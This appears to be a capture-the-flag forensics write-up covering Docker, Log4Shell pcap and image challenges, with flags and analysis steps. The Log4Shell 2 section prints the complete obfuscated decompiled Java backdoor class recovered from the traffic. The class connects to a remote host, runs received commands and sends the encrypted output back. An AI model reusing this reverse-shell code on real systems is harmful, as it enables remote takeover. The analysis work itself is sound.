## Whale
Docker forensic maybe?
Part 1 found by using grep

![image](https://hackmd.io/_uploads/HkT9zjkDkg.png)

Part 2 also by grep

![image](https://hackmd.io/_uploads/ByVofiJPyg.png)

Part 3 is encrypted by app.py uploaded to /tmp
```
from flask import Flask, request, jsonify
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
  # Get query parameters
  file_path = request.args.get('a')
  encryption_key = request.args.get('b')

  if not file_path:
    return jsonify({"error": "Query parameter 'a' is required for file path."}), 400

  try:
    encoded_file = request.data.decode('utf-8')
    file_content = base64.b64decode(encoded_file)

    if encryption_key:
      if len(encryption_key) not in (16, 24, 32):
        return jsonify({"error": "Encryption key must be 16, 24, or 32 bytes long."}), 400
      cipher = AES.new(encryption_key.encode('utf-8'), AES.MODE_ECB)
      file_content = cipher.encrypt(pad(file_content, AES.block_size))

    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, 'wb') as f:
      f.write(file_content)

    return jsonify({"message": "File uploaded successfully."}), 200

  except base64.binascii.Error:
    return jsonify({"error": "Invalid Base64-encoded string."}), 400
  except Exception as e:
    return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
  app.run(debug=True, host='0.0.0.0')
  ```
![image](https://hackmd.io/_uploads/r1nCfo1PJg.png)

Request log at:
`whale\whale\var\lib\docker\containers\4e5f2fa4c43bba8c3123d068f2ec24e4399a860113d41cccbeb75c428cb04e`

![image](https://hackmd.io/_uploads/rymTzj1Pye.png)

B used as key for decryption

![image](https://hackmd.io/_uploads/HykCzj1v1g.png)


Flag:
`CJ{dae071f96aadfb8c2417ed6715711cb9e36e6c1e}`



## Log4Shell 1
`frame.coloring_rule.name == "Bad TCP" && frame.len == 141`
![image](https://hackmd.io/_uploads/r1vU7oywJg.png)

`CJ{c4n_y0u_c0ntinu3_unt1l_Flag_2?}`

## Log4Shell 2
continue from part 1, you will notice there is Dropper.class that exist in the pcap

![image](https://hackmd.io/_uploads/S1rYXokvke.png)

dump and decompile

This class, Dropper, is used to decrypt a Base64-encoded string and save the decrypted content to a file using AES encryption.

Key points:
- Get Secret Key: The secret key for decryption is obtained by fetching environment variables named FLAGPART1 to FLAGPART16 and concatenating them.
- Decrypt Method: The method decryptToFile takes a Base64-encoded string and decrypts it using the secret key, then writes the decrypted content to a file.
- AES Encryption: AES encryption is used with the mode ECB and padding PKCS5Padding

```
for (int i = 1; i <= 16; i++) {
            str = str + ((String) method.invoke(null, "FLAGPART" + i));
        }
```

notice that it only took the first 16 bytes so the key would be: `CJ{c4n_y0u_c0nt1`

using this key we will be able to decrypt the ct in the class and got another class

```
package defpackage;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* loaded from: download.class */
public class Comms {
    private static final /* synthetic */ String[] I = null;
    private static final /* synthetic */ String XXX;
    private static final /* synthetic */ String YYY;
    private static final /* synthetic */ int[] l = null;

    private static void IIl() {
        l = new int[32];
        l[0] = ((((21 + 181) - 65) + 113) ^ (((46 + 154) - 161) + 126)) & (((151 ^ 185) ^ (77 ^ 60)) ^ (-" ".length()));
        l[1] = "  ".length();
        l[2] = " ".length();
        l[3] = "   ".length();
        l[4] = (85 ^ 49) ^ (163 ^ 195);
        l[5] = 127 ^ 122;
        l[6] = 104 ^ 110;
        l[7] = (((87 + 12) - (-35)) + 36) ^ (((83 + 116) - 132) + 106);
        l[8] = 24 ^ 16;
        l[9] = (((182 + 39) - 48) + 11) ^ (((50 + 91) - 39) + 75);
        l[10] = (19 ^ 65) ^ (1 ^ 89);
        l[11] = 92 ^ 87;
        l[12] = 50 ^ 62;
        l[13] = 71 ^ 74;
        l[14] = 27 ^ 21;
        l[15] = 146 ^ 157;
        l[16] = (161 ^ 174) ^ (144 ^ 143);
        l[17] = 141 ^ 156;
        l[18] = 73 ^ 91;
        l[19] = (95 ^ 99) ^ (187 ^ 148);
        l[20] = 124 ^ 104;
        l[21] = (203 ^ 192) ^ (189 ^ 163);
        l[22] = (1 ^ 104) ^ (((108 + 36) - 21) + 4);
        l[23] = (47 ^ 24) ^ (137 ^ 169);
        l[24] = (120 ^ 117) ^ (13 ^ 24);
        l[25] = (((59 + 50) - 57) + 83) ^ (((3 + 96) - (-11)) + 48);
        l[26] = (((142 + 117) - 184) + 113) ^ (((153 + 63) - 187) + 137);
        l[27] = (-8257) & 9593;
        l[28] = 26 ^ 1;
        l[29] = (105 ^ 96) ^ (39 ^ 50);
        l[30] = 41 ^ 52;
        l[31] = (((135 + 73) - 150) + 88) ^ (((21 + 88) - 1) + 32);
    }

    private static void ll() {
        I = new String[l[31]];
        I[l[0]] = I("eBq0gvhn60zfo1MunQjxEq+VgKjg5XsIv3e9pz85TDc=", "nErxg");
        I[l[2]] = l("XnpOLQlfekJ7XFwhTC8NXQ==", "nCzKk");
        I[l[1]] = I("7Ep1Z+Gia+U=", "UWraX");
        I[l[3]] = l("GxQcABJfFhgYGgUaRCIDAR0PEw==", "qujaj");
        I[l[4]] = l("AjwsJhwWLTkBEQA=", "eYXor");
        I[l[5]] = l("Ewc5RxARAEU4HhERXzg0NiYDBjI=", "RBjhU");
        I[l[6]] = l("Lx8HDA==", "FqnxZ");
        I[l[7]] = I("GHxTbaCWgquBBBSGerx+TiFBtURhB40u", "KcZiK");
        I[l[8]] = Il("Cf4KGA89+bA=", "uMCDA");
        I[l[9]] = Il("o1OzBtlndQ+3+IyNY+3z+HrXBauLHpzj", "OaiGN");
        I[l[10]] = Il("R5lwGFYcS7eccTUFCOhdLg==", "KunRL");
        I[l[11]] = l("ERwyKBERJj4UAQYbPyA=", "trQGu");
        I[l[12]] = Il("2/vFTel4NG6ys7fiFcHEt0wZOsC1vJqXP5GHiA7T9jE=", "dhvCA");
        I[l[13]] = l("fV1yEhJ8XX5ER38GcBAWfg==", "MdFtp");
        I[l[14]] = l("AwoL", "BOXvi");
        I[l[15]] = Il("kqsvxVHphdfXglIktDCFoHPv2dha64mD", "YbUwj");
        I[l[16]] = l("Lg8VPC86HgAbIiw=", "IjauA");
        I[l[17]] = Il("vLru125xRYdTLHj1VD9qtUsvKbrijfbX", "RqduM");
        I[l[18]] = Il("xRwDzYljVIU=", "fScWC");
        I[l[19]] = l("EAkMJl8JDRkyAxMcA2k6HxE=", "zhzGq");
        I[l[20]] = l("LyQVKDwqJw==", "KKSAR");
        I[l[21]] = l("CwkvD2gUHDACaCMJKgtwVQ==", "ahYnF");
        I[l[22]] = Il("uIHhwTaeAscF3EzVgdL4zg==", "tMxGZ");
        I[l[23]] = l("ChYmChAL", "nsEet");
        I[l[24]] = l("al9YAjJrX1RUZ2gEWgA2aQ==", "ZfldP");
        I[l[25]] = l("JygSTjMlL24xPSU+dDEXAgkoDxE=", "fmAav");
        I[l[26]] = I("EvA8rhxJMXPTCc0Wno5a9Q==", "QvZtB");
        I[l[28]] = l("OTAxITtw", "zxtbp");
        I[l[29]] = Il("gT9cJw1pjVI=", "eTlqI");
        I[l[30]] = I("BAW3Glpb798=", "pExyG");
    }

    private static boolean lll(int i, int i2) {
        return i < i2;
    }

    static {
        IIl();
        ll();
        XXX = I[l[24]];
        YYY = I[l[25]];
        try {
            Socket socket = new Socket(I[l[26]], l[27]);
            try {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                try {
                    BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                    do {
                        try {
                            bufferedWriter.write(I[l[28]]);
                            bufferedWriter.flush();
                            String readLine = bufferedReader.readLine();
                            if (lIl(readLine) && Ill(readLine.isEmpty() ? 1 : 0)) {
                                BufferedReader bufferedReader2 = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(decrypt(readLine)).getInputStream()));
                                StringBuilder sb = new StringBuilder();
                                do {
                                    String readLine2 = bufferedReader2.readLine();
                                    if (lIl(readLine2)) {
                                        sb.append(readLine2).append(I[l[29]]);
                                        "".length();
                                        "".length();
                                    } else {
                                        bufferedWriter.write(String.valueOf(new StringBuilder().append(encrypt(String.valueOf(sb))).append(I[l[30]])));
                                        bufferedWriter.flush();
                                    }
                                } while ((-"   ".length()) < 0);
                                return;
                            }
                            Thread.sleep(5000L);
                            "".length();
                        } catch (Throwable th) {
                            try {
                                bufferedWriter.close();
                                "".length();
                                if ("  ".length() < 0) {
                                    return;
                                }
                            } catch (Throwable th2) {
                                th.addSuppressed(th2);
                            }
                            throw th;
                        }
                    } while ((107 ^ 111) >= "   ".length());
                } catch (Throwable th3) {
                    try {
                        bufferedReader.close();
                        "".length();
                        if ((((((4 + 93) - 74) + 114) ^ (((54 + 50) - (-65)) + 28)) & (((101 ^ 120) ^ (60 ^ 109)) ^ (-" ".length()))) < 0) {
                            return;
                        }
                    } catch (Throwable th4) {
                        th3.addSuppressed(th4);
                    }
                    throw th3;
                }
            } catch (Throwable th5) {
                try {
                    socket.close();
                    "".length();
                    if ("  ".length() != "  ".length()) {
                        return;
                    }
                } catch (Throwable th6) {
                    th5.addSuppressed(th6);
                }
                throw th5;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String encrypt(String str) throws Exception {
        Class<?> cls = Class.forName(I[l[0]]);
        Class<?>[] clsArr = new Class[l[1]];
        clsArr[l[0]] = byte[].class;
        clsArr[l[2]] = String.class;
        Constructor<?> constructor = cls.getConstructor(clsArr);
        Object[] objArr = new Object[l[1]];
        objArr[l[0]] = I[l[2]].getBytes();
        objArr[l[2]] = I[l[1]];
        Object newInstance = constructor.newInstance(objArr);
        Class<?> cls2 = Class.forName(I[l[3]]);
        String str2 = I[l[4]];
        Class<?>[] clsArr2 = new Class[l[2]];
        clsArr2[l[0]] = String.class;
        Method method = cls2.getMethod(str2, clsArr2);
        Object[] objArr2 = new Object[l[2]];
        objArr2[l[0]] = I[l[5]];
        Object invoke = method.invoke(null, objArr2);
        String str3 = I[l[6]];
        Class<?>[] clsArr3 = new Class[l[1]];
        clsArr3[l[0]] = Integer.TYPE;
        clsArr3[l[2]] = Class.forName(I[l[7]]);
        Method method2 = cls2.getMethod(str3, clsArr3);
        Object[] objArr3 = new Object[l[1]];
        objArr3[l[0]] = Integer.valueOf(l[2]);
        objArr3[l[2]] = newInstance;
        method2.invoke(invoke, objArr3);
        "".length();
        String str4 = I[l[8]];
        Class<?>[] clsArr4 = new Class[l[2]];
        clsArr4[l[0]] = byte[].class;
        Method method3 = cls2.getMethod(str4, clsArr4);
        Object[] objArr4 = new Object[l[2]];
        objArr4[l[0]] = str.getBytes();
        byte[] bArr = (byte[]) method3.invoke(invoke, objArr4);
        Object invoke2 = Class.forName(I[l[9]]).getMethod(I[l[10]], new Class[l[0]]).invoke(null, new Object[l[0]]);
        Class<?> cls3 = invoke2.getClass();
        String str5 = I[l[11]];
        Class<?>[] clsArr5 = new Class[l[2]];
        clsArr5[l[0]] = byte[].class;
        Method method4 = cls3.getMethod(str5, clsArr5);
        Object[] objArr5 = new Object[l[2]];
        objArr5[l[0]] = bArr;
        return (String) method4.invoke(invoke2, objArr5);
    }

    private static String I(String IlIlIlIllllllll, String lIIlIlIllllllll) {
        try {
            SecretKeySpec secretKeySpec = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(lIIlIlIllllllll.getBytes(StandardCharsets.UTF_8)), "Blowfish");
            Cipher cipher = Cipher.getInstance("Blowfish");
            cipher.init(l[1], secretKeySpec);
            return new String(cipher.doFinal(Base64.getDecoder().decode(IlIlIlIllllllll.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
        } catch (Exception llIlIlIllllllll) {
            llIlIlIllllllll.printStackTrace();
            return null;
        }
    }

    private static String Il(String lIlllIIllllllll, String IIlllIIllllllll) {
        try {
            SecretKeySpec IIIIIlIllllllll = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(IIlllIIllllllll.getBytes(StandardCharsets.UTF_8)), l[8]), "DES");
            Cipher lllllIIllllllll = Cipher.getInstance("DES");
            lllllIIllllllll.init(l[1], IIIIIlIllllllll);
            return new String(lllllIIllllllll.doFinal(Base64.getDecoder().decode(lIlllIIllllllll.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
        } catch (Exception IllllIIllllllll) {
            IllllIIllllllll.printStackTrace();
            return null;
        }
    }

    private static String l(String lIllIIIllllllll, String IIllIIIllllllll) {
        String str = new String(Base64.getDecoder().decode(lIllIIIllllllll.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
        StringBuilder llIlIIIllllllll = new StringBuilder();
        char[] IlIlIIIllllllll = IIllIIIllllllll.toCharArray();
        int lIIlIIIllllllll = l[0];
        char[] charArray = str.toCharArray();
        int length = charArray.length;
        int i = l[0];
        while (lll(i, length)) {
            llIlIIIllllllll.append((char) (charArray[i] ^ IlIlIIIllllllll[lIIlIIIllllllll % IlIlIIIllllllll.length]));
            "".length();
            lIIlIIIllllllll++;
            i++;
            "".length();
            if ((188 ^ 184) < "  ".length()) {
                return null;
            }
        }
        return String.valueOf(llIlIIIllllllll);
    }

    private static boolean Ill(int i) {
        return i == 0;
    }

    private static String decrypt(String llIIlIlllllllll) throws Exception {
        Class<?> cls = Class.forName(I[l[12]]);
        Class<?>[] clsArr = new Class[l[1]];
        clsArr[l[0]] = byte[].class;
        clsArr[l[2]] = String.class;
        Constructor<?> constructor = cls.getConstructor(clsArr);
        Object[] objArr = new Object[l[1]];
        objArr[l[0]] = I[l[13]].getBytes();
        objArr[l[2]] = I[l[14]];
        Object newInstance = constructor.newInstance(objArr);
        Class<?> cls2 = Class.forName(I[l[15]]);
        String str = I[l[16]];
        Class<?>[] clsArr2 = new Class[l[2]];
        clsArr2[l[0]] = String.class;
        Method method = cls2.getMethod(str, clsArr2);
        Object[] objArr2 = new Object[l[2]];
        objArr2[l[0]] = I[l[17]];
        Object invoke = method.invoke(null, objArr2);
        String str2 = I[l[18]];
        Class<?>[] clsArr3 = new Class[l[1]];
        clsArr3[l[0]] = Integer.TYPE;
        clsArr3[l[2]] = Class.forName(I[l[19]]);
        Method method2 = cls2.getMethod(str2, clsArr3);
        Object[] objArr3 = new Object[l[1]];
        objArr3[l[0]] = Integer.valueOf(l[1]);
        objArr3[l[2]] = newInstance;
        method2.invoke(invoke, objArr3);
        "".length();
        String str3 = I[l[20]];
        Class<?>[] clsArr4 = new Class[l[2]];
        clsArr4[l[0]] = byte[].class;
        Method method3 = cls2.getMethod(str3, clsArr4);
        Object invoke2 = Class.forName(I[l[21]]).getMethod(I[l[22]], new Class[l[0]]).invoke(null, new Object[l[0]]);
        Class<?> cls3 = invoke2.getClass();
        String str4 = I[l[23]];
        Class<?>[] clsArr5 = new Class[l[2]];
        clsArr5[l[0]] = String.class;
        Method method4 = cls3.getMethod(str4, clsArr5);
        Object[] objArr4 = new Object[l[2]];
        objArr4[l[0]] = llIIlIlllllllll;
        byte[] bArr = (byte[]) method4.invoke(invoke2, objArr4);
        Object[] objArr5 = new Object[l[2]];
        objArr5[l[0]] = bArr;
        return new String((byte[]) method3.invoke(invoke, objArr5));
    }

    private static boolean lIl(Object obj) {
        return obj != null;
    }
}
```

this Comms class connects to a remote server, sends and receives data, and decrypts or executes commands. It uses encryption and reflection for some parts of its functionality.

- Socket Connection: The class connects to a remote server via a Socket and communicates using BufferedReader and BufferedWriter.
- Decryption and Execution: When a message is received, it is decrypted and used to execute commands on the server using Runtime.getRuntime().exec().
- Reflection: The code uses reflection to dynamically call methods and instantiate classes, including encryption and decryption routines.
- Encryption Methods: The class uses Blowfish and DES encryption for decoding and encoding strings, and the decrypted data is sent back to the server.

the comm class shoud be the one that resulting this traffic
![image](https://hackmd.io/_uploads/HJMtEoyv1x.png)

from the previous class, we got key and encryption method used that we can use to decrypt the comm traffic
![image](https://hackmd.io/_uploads/rkSnLjkPyl.png)

## Grayscale
![image](https://hackmd.io/_uploads/B1DYd2JwJe.png)

![image](https://hackmd.io/_uploads/rJptd3yvkg.png)

`CJ{_s0_15_it_pr0nounc3d_GiF_or_JiF?_}`
